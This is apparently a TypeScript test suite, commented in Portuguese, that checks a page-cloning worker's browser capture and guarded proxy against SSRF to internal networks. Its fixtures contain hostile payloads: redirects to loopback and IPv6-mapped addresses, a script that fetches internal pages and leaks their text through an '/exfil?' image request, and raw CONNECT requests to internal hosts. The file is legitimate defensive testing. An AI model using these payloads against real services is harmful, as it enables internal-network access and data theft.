/**
 * Correções G1 — proteção contra SSRF na captura (security#0 e security#2).
 *
 * Um site "público" (pub.g1.test, mapeado para um servidor local) tenta levar
 * o Chromium da captura para servidores internos: redirecionamento 302,
 * navegação por JavaScript, IPv6 literal ([::1], [::ffff:127.0.0.1]),
 * "localhost", https (túnel CONNECT) e WebSocket. Nenhuma conexão pode chegar
 * aos servidores internos, e a clonagem falha com a mensagem de rede interna.
 */
import http from "node:http";
import type { AddressInfo } from "node:net";
import net from "node:net";
import { type Browser, chromium } from "playwright";
import { afterAll, beforeAll, beforeEach, describe, expect, it } from "vitest";
import { prisma } from "@/lib/db";
import { capturePage } from "@/worker/clone/capture";
import { PROXY_ERROR_HEADER, startGuardedProxy } from "@/worker/clone/fetcher";
import { assertPublicUrl, friendlyCloneError, runCloneJob } from "@/worker/clone/job";

const INTERNAL = "Esse endereço aponta para a rede interna e foi bloqueado por segurança.";
const HOST_MAP = { "pub.g1.test": "127.0.0.1" };

let browser: Browser;
let internal4: http.Server;
let internal6: http.Server | null = null;
let pub: http.Server;
let p4 = 0;
let p6 = 0;
let pp = 0;
/** Conexões TCP que chegaram aos servidores internos (deve ficar sempre vazio). */
const internalHits: string[] = [];

function listen(server: http.Server, host: string): Promise<number> {
  return new Promise((resolve, reject) => {
    server.once("error", reject);
    server.listen(0, host, () => resolve((server.address() as AddressInfo).port));
  });
}

function internalServer(tag: string) {
  const server = http.createServer((req, res) => {
    internalHits.push(`${tag} ${req.method} ${req.url}`);
    res.setHeader("access-control-allow-origin", "*");
    res.setHeader("content-type", "text/html; charset=utf-8");
    res.end("<html><body><h1>SEGREDO INTERNO</h1></body></html>");
  });
  server.on("connection", () => internalHits.push(`${tag} conexão`));
  return server;
}

const TEXT = `<p>${"Oferta pública com bastante texto para parecer uma página de verdade. ".repeat(10)}</p>`;

function page(body: string) {
  return `<!doctype html><html><head><meta charset="utf-8"><title>Pública</title></head><body>${TEXT}${body}</body></html>`;
}

beforeAll(async () => {
  internal4 = internalServer("v4");
  p4 = await listen(internal4, "127.0.0.1");
  try {
    internal6 = internalServer("v6");
    p6 = await listen(internal6, "::1");
  } catch {
    internal6 = null; // máquina sem IPv6 local
  }
  pub = http.createServer((req, res) => {
    const redirect = (location: string) => {
      res.writeHead(302, { location });
      res.end();
    };
    const url = req.url ?? "/";
    if (url === "/go") return redirect(`http://127.0.0.1:${p4}/main-redirect`);
    if (url === "/go-localhost") return redirect(`http://localhost:${p4}/via-nome`);
    if (url === "/go-https") return redirect(`https://127.0.0.1:${p4}/tls`);
    if (url === "/go-mapped") return redirect(`http://[::ffff:127.0.0.1]:${p4}/mapped`);
    if (url === "/go6") return redirect(`http://[::1]:${p6}/v6`);
    if (url === "/r-img") return redirect(`http://127.0.0.1:${p4}/img`);
    res.setHeader("content-type", "text/html; charset=utf-8");
    if (url === "/jsnav") {
      return res.end(
        page(
          `<script>setTimeout(function(){ location.href = "http://[::ffff:7f00:1]:${p4}/jsnav?x=1"; }, 50);</script>`,
        ),
      );
    }
    if (url === "/sub") {
      return res.end(
        page(`<img src="/r-img"><iframe src="http://127.0.0.1:${p4}/iframe"></iframe>
<script>
  const leak = (t) => { const i = new Image(); i.src = "/exfil?" + encodeURIComponent(t); };
  fetch("http://[::1]:${p6}/v6").then((r) => r.text()).then(leak).catch(() => {});
  fetch("http://[::ffff:127.0.0.1]:${p4}/mapped").then((r) => r.text()).then(leak).catch(() => {});
  fetch("http://localhost:${p4}/nome").then((r) => r.text()).then(leak).catch(() => {});
  try { new WebSocket("ws://127.0.0.1:${p4}/ws"); } catch (e) {}
</script>`),
      );
    }
    res.end(page("<p>ok</p>"));
  });
  pp = await listen(pub, "127.0.0.1");
  browser = await chromium.launch();
}, 60_000);

afterAll(async () => {
  await browser?.close();
  await new Promise((r) => pub?.close(r));
  await new Promise((r) => internal4?.close(r));
  if (internal6) await new Promise((r) => internal6?.close(r));
});

beforeEach(() => {
  internalHits.length = 0;
});

function capture(pathname: string, logs: string[] = []) {
  return capturePage({
    browser,
    device: "desktop",
    url: `http://pub.g1.test:${pp}${pathname}`,
    log: (level, message, url) => logs.push(`${level} ${message} ${url ?? ""}`),
    hostMap: HOST_MAP,
    allowPrivate: false,
    maxScrollMs: 500,
  });
}

async function captureError(pathname: string) {
  try {
    await capture(pathname);
  } catch (err) {
    return err;
  }
  throw new Error(`a captura de ${pathname} deveria ter falhado`);
}

describe("captura: redirecionamentos e navegações para a rede interna (security#0)", () => {
  it.each([
    ["/go", "302 para http://127.0.0.1"],
    ["/go-localhost", "302 para um nome que resolve para 127.0.0.1"],
    ["/go-https", "302 para https://127.0.0.1 (túnel CONNECT)"],
    ["/go-mapped", "302 para [::ffff:127.0.0.1]"],
  ])("%s (%s): falha com a mensagem de rede interna e nada chega ao servidor interno", async (pathname) => {
    const err = await captureError(pathname);
    expect(friendlyCloneError(err)).toBe(INTERNAL);
    expect(internalHits).toEqual([]);
  }, 60_000);

  it("302 para [::1] (IPv6 literal)", async () => {
    if (!internal6) return;
    const err = await captureError("/go6");
    expect(friendlyCloneError(err)).toBe(INTERNAL);
    expect(internalHits).toEqual([]);
  }, 60_000);

  it("navegação por JavaScript para [::ffff:7f00:1] não é capturada", async () => {
    const err = await captureError("/jsnav");
    expect(friendlyCloneError(err)).toBe(INTERNAL);
    expect(internalHits).toEqual([]);
  }, 60_000);

  it("subrecursos, fetch, iframe e WebSocket para a rede interna são barrados; a página pública é capturada", async () => {
    const logs: string[] = [];
    const cap = await capture("/sub", logs);
    expect(cap.renderedHtml).toContain("Oferta pública");
    expect(cap.renderedHtml).not.toContain("SEGREDO");
    for (const body of cap.responses.values()) expect(body.body.toString("latin1")).not.toContain("SEGREDO");
    expect(internalHits).toEqual([]);
    expect(logs.some((l) => l.startsWith("WARN Endereço interno bloqueado por segurança."))).toBe(true);
  }, 60_000);

  it("clonagem pelo worker: link público que redireciona para a rede interna falha com mensagem clara", async () => {
    const previous = process.env.OS_CLONE_HOST_MAP;
    process.env.OS_CLONE_HOST_MAP = "pub.g1.test=127.0.0.1";
    try {
      const job = await prisma.cloneJob.create({
        data: { source: "URL", sourceUrl: `http://pub.g1.test:${pp}/go`, options: { devices: ["desktop"] } },
      });
      await runCloneJob(job.id);
      const done = await prisma.cloneJob.findUniqueOrThrow({ where: { id: job.id } });
      expect(done.status).toBe("FAILED");
      expect(done.errorMessage).toBe(INTERNAL);
      expect(internalHits).toEqual([]);
    } finally {
      if (previous === undefined) delete process.env.OS_CLONE_HOST_MAP;
      else process.env.OS_CLONE_HOST_MAP = previous;
    }
  }, 120_000);
});

describe("IPv6 literal no link (security#2)", () => {
  it.each([
    "http://[::1]:8080/",
    "http://[::ffff:127.0.0.1]/",
    "http://[::ffff:7f00:1]/",
    "http://[fe80::1]/",
    "http://[fd00::1]/",
  ])("assertPublicUrl(%s) recusa com a mensagem de rede interna", async (url) => {
    await expect(assertPublicUrl(url, {}, false)).rejects.toThrow(INTERNAL);
  });

  it("IPv6 público literal passa sem consultar DNS", async () => {
    await expect(assertPublicUrl("http://[2606:4700:4700::1111]/", {}, false)).resolves.toBeUndefined();
  });
});

// ─── Proxy seguro, direto ────────────────────────────────────────────────────

function rawProxyRequest(proxyServer: string, request: string): Promise<string> {
  const { port } = new URL(proxyServer);
  return new Promise((resolve, reject) => {
    const socket = net.connect(Number(port), "127.0.0.1", () => socket.write(request));
    const chunks: Buffer[] = [];
    const done = () => resolve(Buffer.concat(chunks).toString("utf8"));
    socket.on("data", (chunk: Buffer) => chunks.push(chunk));
    socket.on("end", done);
    socket.on("close", done);
    socket.on("error", reject);
    setTimeout(() => {
      socket.destroy();
      done();
    }, 3000);
  });
}

describe("startGuardedProxy", () => {
  it("CONNECT para IP interno (v4, v6 e v4-em-v6): 403 com o motivo, sem conectar", async () => {
    const blocked: string[] = [];
    const proxy = await startGuardedProxy({ onBlocked: (t) => blocked.push(t) });
    try {
      for (const target of [`127.0.0.1:${p4}`, `[::1]:${p6 || 80}`, `[::ffff:127.0.0.1]:${p4}`, `localhost:${p4}`]) {
        const reply = await rawProxyRequest(proxy.server, `CONNECT ${target} HTTP/1.1\r\nHost: ${target}\r\n\r\n`);
        expect(reply, target).toMatch(/^HTTP\/1\.1 403/);
        expect(reply.toLowerCase()).toContain(`${PROXY_ERROR_HEADER}: blocked`);
      }
      expect(proxy.failureFor("127.0.0.1")?.code).toBe("BLOCKED");
      expect(proxy.failureFor("[::1]")?.code).toBe("BLOCKED");
      expect(blocked.length).toBe(4);
      expect(internalHits).toEqual([]);
    } finally {
      await proxy.close();
    }
  });

  it("http:// para a rede interna: 403 com o cabeçalho de erro, sem conectar", async () => {
    const proxy = await startGuardedProxy();
    try {
      const reply = await rawProxyRequest(
        proxy.server,
        `GET http://127.0.0.1:${p4}/x HTTP/1.1\r\nHost: 127.0.0.1:${p4}\r\nConnection: close\r\n\r\n`,
      );
      expect(reply).toMatch(/^HTTP\/1\.1 403/);
      expect(reply.toLowerCase()).toContain(`${PROXY_ERROR_HEADER}: blocked`);
      expect(internalHits).toEqual([]);
    } finally {
      await proxy.close();
    }
  });

  it("nomes do hostMap passam (http e CONNECT), e allowPrivate libera a rede interna", async () => {
    const proxy = await startGuardedProxy({ hostMap: HOST_MAP });
    try {
      const plain = await rawProxyRequest(
        proxy.server,
        `GET http://pub.g1.test:${pp}/ HTTP/1.1\r\nHost: pub.g1.test:${pp}\r\nConnection: close\r\n\r\n`,
      );
      expect(plain).toMatch(/^HTTP\/1\.1 200/);
      expect(plain).toContain("Oferta pública");
      const tunnel = await rawProxyRequest(
        proxy.server,
        `CONNECT pub.g1.test:${pp} HTTP/1.1\r\nHost: pub.g1.test:${pp}\r\n\r\nGET / HTTP/1.1\r\nHost: pub.g1.test:${pp}\r\nConnection: close\r\n\r\n`,
      );
      expect(tunnel).toMatch(/^HTTP\/1\.1 200 Connection Established/);
      expect(tunnel).toContain("Oferta pública");
    } finally {
      await proxy.close();
    }
    const open = await startGuardedProxy({ allowPrivate: true });
    try {
      const reply = await rawProxyRequest(
        open.server,
        `GET http://127.0.0.1:${p4}/permitido HTTP/1.1\r\nHost: 127.0.0.1:${p4}\r\nConnection: close\r\n\r\n`,
      );
      expect(reply).toContain("SEGREDO INTERNO");
    } finally {
      await open.close();
    }
  });
});
